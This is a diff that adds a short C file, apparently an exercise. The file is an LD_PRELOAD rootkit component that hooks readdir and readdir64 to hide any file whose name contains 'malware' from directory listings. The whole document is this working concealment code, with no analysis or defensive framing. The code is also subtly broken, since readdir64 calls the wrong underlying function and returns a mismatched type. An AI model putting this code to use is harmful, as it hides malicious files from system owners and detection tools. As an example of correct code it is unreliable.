@@ -1,0 +1,51 @@
+#define _GNU_SOURCE
+
+#include <stdio.h>
+#include <dlfcn.h>
+#include <stdlib.h>
+#include <stdarg.h>
+#include <dirent.h>
+
+static void init (void) __attribute__ ((constructor));
+
+static struct dirent *(*old_readdir)(DIR *dir);
+static struct dirent64 *(*old_readdir64)(DIR *dir);
+
+
+void init(void)
+{
+	old_readdir = dlsym(RTLD_NEXT, "readdir");
+	old_readdir64 = dlsym(RTLD_NEXT, "readdir64");
+}
+
+struct dirent * readdir(DIR *dirp)
+{
+	
+    struct dirent * dir;
+
+    dir = old_readdir(dirp);
+
+    while (dir != NULL && strstr(dir->d_name,"malware") != NULL){//nicht letzter Eintrag && //contains string malware
+    		dir = old_readdir(dirp);
+    	
+    }
+
+    return dir;
+	
+}
+
+struct dirent * readdir64(DIR *dirp)
+{
+	struct dirent * dir;
+
+    dir = old_readdir(dirp);
+
+    while (dir != NULL && strstr(dir->d_name,"malware") != NULL){//nicht letzter Eintrag && //contains string malware
+    		dir = old_readdir(dirp);
+    	
+    }
+
+    return dir;
+	
+	
+}
